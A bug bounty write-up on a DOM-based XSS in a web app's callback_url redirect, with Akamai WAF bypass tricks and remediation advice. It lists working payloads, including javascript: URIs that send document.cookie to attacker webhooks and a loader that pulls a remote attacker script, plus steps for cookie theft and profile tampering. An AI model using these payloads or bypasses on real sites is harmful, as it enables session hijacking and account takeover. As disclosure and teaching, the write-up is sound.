Welcome to my first bug bounty writeup! üéâ
In this report, I uncover a DOM-based Cross-Site Scripting (XSS) vulnerability in the callback_url parameter of a web application, demonstrate how I bypassed a modern WAF, and show how an attacker could achieve full account compromise through session hijacking and profile manipulation.

üß© Vulnerability Overview

  • Type: DOM-based XSS
  • Parameter: callback_url in URL query
  • Location: Client-side redirect via window.location.href
  • WAF: Akamai WAF blocks common javascript: URIs
  • Impact: Account takeover, data exfiltration, profile manipulation

üîç Root Cause Analysis

The application’s JavaScript code contains a critical flaw in how it handles URL parameters:

const k = new URLSearchParams(window.location.search).get("callback_url");
if (k) {
  window.location.href = k;
}

The Problem:

  1. User input from callback_url parameter is retrieved directly from window.location.search
  2. No validation or sanitization is applied to the URI scheme
  3. The value is directly assigned to window.location.href without any checks
  4. This allows javascript: URIs to execute arbitrary code in the user’s browser context

üöß WAF Bypass Techniques

The target employs Akamai WAF which blocks common XSS payloads. However, I discovered several bypass techniques:

1. Optional Chaining Operator

Using the ?. operator to evade signature detection:

javascript:print?.()

2. String Concatenation

Breaking up sensitive keywords to avoid pattern matching:

javascript:fetch?.('https://webhook.com?c='+document['co'+'okie'])

3. Dynamic Script Loading

For complex payloads, loading external scripts:

javascript:d=document;a='scr';b='ipt';s=d.createElement?.(a%2Bb);s.src='https://cdn.jsdelivr.net/gh/attacker/payload.js';d.body.appendChild?.(s)

üî• Exploitation Scenarios

Scenario 1: Cookie Exfiltration

Payload:

https://example.com/social-ads/?callback_url=javascript:fetch?.('https://attacker.webhook.com?q='%2bdocument['co'%2b'okie'])

Result: User’s session cookies are sent to attacker-controlled endpoint.

Scenario 2: Account Profile Manipulation

I developed a sophisticated payload that:

  1. Extracts the user’s profile information
  2. Retrieves CSRF tokens from the current session
  3. Modifies user profile data without consent

External Script (payload.js):

function getUser() {
  return fetch('https://example.com/user-settings/notification', { 
    credentials: 'include' 
  })
    .then(res => res.text())
    .then(html => {
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const script = [...doc.scripts].find(s => 
        s.textContent.includes('window.__PRELOADED_STATE__')
      );
      const json = script.textContent.match(/JSON\.parse\("(.+?)"\)/)[1]
        .replace(/\\"/g, '"').replace(/\\\\/g, '\\');
      const data = JSON.parse(json);
      return data.user.basic_info.profile_url.split('/')[2];
    })
    .catch(_ => {
      alert('POC worked, but user not authenticated');
    });
}

üåê Network-Based WAF Bypass

Interesting Discovery: The WAF behavior was inconsistent across different networks:

  1. Corporate/WiFi Networks: WAF actively blocked payloads
  2. Mobile Networks: WAF rules were less restrictive
  3. Different Geographic Locations: Varying protection levels

This suggests the WAF implementation may have network-specific rules or geographic variations in protection policies.

üìã Step-by-Step Reproduction

Basic XSS Verification:

  1. Navigate to: https://example.com/social-ads/?callback_url=/x
  2. If blocked by WAF, switch to mobile network
  3. Test with: https://example.com/social-ads/?callback_url=javascript:print?.()
  4. Perform any login action - the print() dialog will fire

Cookie Exfiltration:

  1. Set up webhook at https://app.beeceptor.com/
  2. Visit: https://example.com/social-ads/?callback_url=javascript:fetch?.('https://your.webhook.com?q='%2bdocument['co'%2b'okie'])
  3. Check webhook logs for intercepted cookies

Profile Manipulation:

  1. Host the payload script on a CDN
  2. Visit: https://example.com/social-ads/?callback_url=javascript:d=document;a='scr';b='ipt';s=d.createElement?.(a%2Bb);s.src='https://cdn.jsdelivr.net/gh/youruser/payload.js';d.body.appendChild?.(s)
  3. User’s profile will be automatically modified

üí• Impact Assessment

Severity: Critical

Attack Scenarios:

  • Session Hijacking: Steal authentication cookies/tokens
  • Account Takeover: Modify user profiles, settings, and personal information
  • Data Exfiltration: Access sensitive user data through authenticated requests
  • Malicious Actions: Perform actions on behalf of the user
  • Phishing: Redirect users to malicious domains after data theft

Business Impact:

  • User privacy violations
  • Potential regulatory compliance issues
  • Reputation damage
  • Mass account compromise potential

üõ°Ô∏è Remediation Recommendations

Immediate Fixes:

  1. Input Validation: Implement strict URI scheme validation

    const allowedSchemes = ['http:', 'https:'];
const url = new URL(callback_url);
if (!allowedSchemes.includes(url.protocol)) {
  // Reject the request
}

  2. Domain Whitelist: Only allow redirects to trusted domains

  3. CSP Headers: Implement strict Content Security Policy

Long-term Security Measures:

  1. Security Code Review: Audit all client-side redirect implementations
  2. WAF Rule Enhancement: Improve detection of obfuscated payloads
  3. Input Sanitization: Sanitize all user-controlled data before use
  4. Regular Security Testing: Implement automated security scanning

üéØ Key Takeaways

  1. WAF Evasion: Modern WAFs can be bypassed with creative obfuscation
  2. Network Variations: Security controls may behave differently across networks
  3. DOM-based XSS: Client-side vulnerabilities can be just as dangerous as server-side
  4. Defense in Depth: Multiple security layers are essential
  5. Input Validation: Never trust user input, even in client-side code
